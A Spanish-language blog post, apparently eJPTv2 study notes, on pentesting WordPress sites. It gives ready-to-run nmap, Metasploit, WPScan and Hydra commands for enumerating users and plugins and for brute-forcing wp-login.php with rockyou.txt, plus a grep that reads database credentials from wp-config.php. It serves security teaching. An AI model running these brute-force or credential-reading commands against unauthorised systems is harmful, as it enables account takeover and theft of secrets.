---
layout: single
title: WordPress Pentesting
excerpt: "Hacking"
date: 2021-05-22
classes: wide
header:
  teaser: /assets/images/Wordpress/1.png
  teaser_home_page: true
  icon: /assets/images/Wordpress/1.png
categories:
  - Wordpress
  - eJPTv2
---

# Auditoria CMS WordPress

-----

##  **ğŸ•µï¸ IdentificaciÃ³n de la versiÃ³n de WordPress y sus componentes**

### **Reconocimiento de servicios en WordPress**

```bash
nmap -sV --script http-wordpress-enum <url> # DetecciÃ³n de la versiÃ³n de WordPress y plugins.
nmap -sV --script "http-wordpress* and not http-wordpress-brute" <url> # Escaneo de vulnerabilidades en WordPress.
nmap -sV --script http-wordpress-users <url> # EnumeraciÃ³n de usuarios de WordPress.
nmap --script=http-wordpress-enum --script-args http-wordpress-enum.root=/ -p 80,443 <URL> # Escaneo completo para confirmar el uso de WordPress.
nmap --script=http-vuln* -p 80,443 <url> # DetecciÃ³n de vulnerabilidades especÃ­ficas en WordPress y sus plugins.
```
TambiÃ©n podemos intentar enumerar plugins con la herramienta _curl_:

```ruby
curl -s -X GET "<ip_victima>" | grep -oP 'plugins/\K.*' | sort -u 
```

> Es importante verificar siempre ciertos directorios durante cualquier escaneo de WordPress.

### **âœ”ï¸ Checklist de WordPress**

ğŸ¯ Para comprobar si existe un panel de inicio de sesiÃ³n:

- url/wp-admin/login.php
- url/wp-admin/wp-login.php
- url/wp-login.php

ğŸ¯ Otros directorios clave a revisar en cualquier sitio web:

- url/robots.txt
- url/sitemap.xml
- url/CHANGELOG.txt

----

Si al acceder al servicio web notamos que no visualmente no carga correctamente, es posible que se estÃ© utilizando *Virtual Hosting*. En este caso, deberemos aÃ±adir el dominio al que apunta realmente en nuestro archivo **/etc/hosts**. Para ello, agregamos la *IP de la web junto con el dominio correspondiente*, por ejemplo: `<ip_objetivo> blog.thm`.

---

###  **ğŸ› ï¸ Escaneo bÃ¡sico de WordPress con Metasploit**

```bash
use auxiliary/scanner/http/wordpress_version # Cargar el mÃ³dulo.
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
```
### **ğŸ•µï¸ EnumeraciÃ³n de usuarios en WordPress**

```bash
use auxiliary/scanner/http/wordpress_users_enum
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
```

### **ğŸ”‘ Ataque de fuerza bruta con Metasploit**

```bash
set RHOSTS <url>
set USERNAME <nombre_usuario> # Nombre de usuario objetivo.
set PASS_FILE /usr/share/wordlists/rockyou.txt # Diccionario de contraseÃ±as.
exploit
```

  ### **ğŸ› ï¸ Otras herramientas para auditar WordPress**

### **ğŸ”¹ WPScan**

**WPScan** es una herramienta especializada en la enumeraciÃ³n y auditorÃ­a de sitios basados en **WordPress**. Permite detectar vulnerabilidades, usuarios, plugins temas instalados y realizar ataques de fuerza bruta.

```bash
wpscan --url <url_wordpress> # AnÃ¡lisis bÃ¡sico de WordPress.
wpscan --url <url_wordpress> -e vp,u # EnumeraciÃ³n de plugins vulnerables y usuarios.
wpscan --url <url_wordpress> -e t # EnumeraciÃ³n de temas instalados.
```
> Para realizar un escaneo mas detallado deberemos aÃ±adir nuestro **token** de wpscan.

> ğŸ’¡ Una buena prÃ¡ctica durante la auditorÃ­a de WordPress es revisar el cÃ³digo fuente de la pÃ¡gina. AllÃ­ podemos encontrar rutas como `/uploads`, analizar si hay _directory listing_, identificar temas, plugins y posibles filtraciones de informaciÃ³n (_information leakage_), vhosts, entre otros.

> ğŸ’¡ TambiÃ©n es recomendable examinar publicaciones de blogs u otras secciones del sitio web en busca de nombres de usuario que puedan ser utilizados en ataques de fuerza bruta.

----

### **ğŸ”‘ Fuerza bruta en el panel de inicio de sesiÃ³n de WordPress**

**Ataque de fuerza bruta con WPScan**

```bash
wpscan --url <url/wp-login.php> -U <username> -P /usr/share/wordlists/rockyou.txt # Uso de diccionario de contraseÃ±as.
wpscan --url <url/wp-login.php> --passwords <ruta_diccionario.txt> --usernames <ruta_usuarios.txt> # Ataque con mÃºltiples usuarios.
```

### **Ataque de fuerza bruta con Hydra**

```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <url> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
```

### Ataque a mÃºltiples usuarios:

```bash
hydra -L <lista_usuarios.txt> -P <diccionario.txt> <url> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
```

> ğŸ Con estos mÃ©todos, podemos identificar la versiÃ³n de WordPress utilizada, detectar plugins y temas instalados, analizar directorios sensibles, localizar paneles de acceso y ejecutar ataques de fuerza bruta para intentar obtener acceso al sistema.

> ğŸ’¡credenciales de la base de datos MySQL dentro de los archivos de configuraciÃ³n de WordPress:

```bash
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

<iframe width="560" height="315" src="https://www.youtube.com/watch?v=cI27_M5_a4E&ab_channel=HenkoSec" 
title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; 
encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
